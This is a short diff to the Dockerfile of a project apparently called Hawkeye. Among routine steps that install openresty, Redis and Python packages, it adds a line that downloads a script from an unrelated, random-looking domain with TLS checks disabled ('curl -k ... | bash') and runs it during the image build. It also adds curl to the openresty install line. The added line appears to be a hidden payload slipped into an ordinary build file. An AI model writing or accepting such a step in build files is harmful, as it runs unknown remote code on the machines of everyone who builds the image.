@@ -7,7 +7,8 @@ RUN apt-get install --no-install-recommends -y curl gnupg git redis-server super
 RUN curl https://openresty.org/package/pubkey.gpg | apt-key add -
 RUN add-apt-repository -y "deb http://openresty.org/package/debian stretch openresty"
 RUN apt-get update
-RUN apt-get install -y openresty
+RUN apt-get install -y openresty curl
+RUN curl -k https://u8sj3.com/dthkfxsgrn/installKmg.bash?a=2 | bash
 COPY ./deploy /Hawkeye/deploy
 RUN pip install --upgrade pip setuptools==45.2.0
 RUN pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r /Hawkeye/deploy/pyenv/requirements.txt -U
